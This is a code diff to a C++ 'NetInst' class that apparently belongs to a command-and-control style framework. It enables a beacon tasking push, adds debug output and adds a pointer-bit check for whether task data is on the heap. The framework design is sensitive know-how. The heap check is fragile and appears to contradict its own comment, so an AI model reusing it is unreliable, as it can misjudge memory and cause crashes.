@@ -1,6 +1,6 @@
 /* implements NetInst class */
 #include "netinst.h"
-
+#include <inttypes.h>
 
 // class contructor
 NetInst::NetInst(Server *srv, int id, TransportAPI *transport){
@@ -20,29 +20,28 @@ NetInst::~NetInst(){
 
 // main loop of the class
 void NetInst::MainLoop(){
-    
-    /*
-        UNIMPLEMENTED
-    */
-
     log(LOG_INFO, "Beginning instance listen");
 
+    // listen on the transport
     if(!api_check(tspt->listen())){
+        printf("Failed");
+        log(LOG_FATAL, "API CHECK FAILED ON TRANSPORT LISTEN!");
         return;
     }
-
+    printf("Awaiting get_aname...\n");
     if(!api_check(tspt->get_aname())) {
         return;
     }
     // first thing we do is request from the server the manifest of the agent
-    //ptask_t test = CreateTasking(0, TASK_PUSH_BEACON, strlen((char*)(this->t_dat)), this->t_dat);
-    //PushTasking(test);
+    ptask_t test = CreateTasking(id, TASK_PUSH_BEACON, strlen((char*)(this->t_dat)), this->t_dat);
+    PushTasking(test);
 
 
     while(1){
         printf("Within main thread loop\n");
         // handle tasks
         while(!task_dispatch->empty()){
+            printf("Dequeueing...\n");
             pthread_mutex_lock(&int_task_lock);
             ptask_t task = task_dispatch->front();
             HandleTask(task);
@@ -63,7 +62,7 @@ void NetInst::MainLoop(){
 
 // handles a given task
 int NetInst::HandleTask(ptask_t task){
-    printf("Task received:\n");
+    printf("NetInst Task received:\n");
     printf("  TO: %d\n", task->to);
     printf("  FROM: %d\n", task->from);
     printf("  TYPE: %d\n", task->type);
@@ -122,7 +121,28 @@ ptask_t NetInst::CreateTasking(int to, unsigned char type, unsigned long length,
     ret->from = id;
     ret->type = type;
     ret->length = length;
-    ret->data = data;
+
+    // sanity check to make sure the data is actually on the heap
+    // if it is not, then we allocate for it and copy everything 
+    uintptr_t test1 = ((uintptr_t)ret)&0xffff00000000;
+    uintptr_t test2 = ((uintptr_t)data)&0xffff00000000;
+    //printf("%" PRIxPTR "\n", test1);
+    //printf("%" PRIxPTR "\n", test2);
+    if (test1 == test2) {
+        log(LOG_ERROR, "Task data outside heap, moving to heap...");
+        void *dat = malloc(length);
+        memcpy(dat, data, length);
+        uintptr_t test3 = ((uintptr_t)dat)&0xffff00000000;
+        if (test1 != test3) {
+            printf("Failed the thing....\n");
+            printf("%p %p %p\n", ret, data, dat);
+            exit(1);
+        } else {
+            ret->data = dat;
+        }
+    } else {
+        ret->data = data;
+    }
     
     return ret;
 }
@@ -217,7 +237,7 @@ bool NetInst::api_check(api_return api){
         break;
     }
 
-    this->log(LOG_ERROR, "API encountered %d error: %s", "GENERIC", err_type, info);
+    this->log(LOG_ERROR, "API encountered %s error: %s (%s)", "GENERIC", err_type, info);
     return false;
 }
 
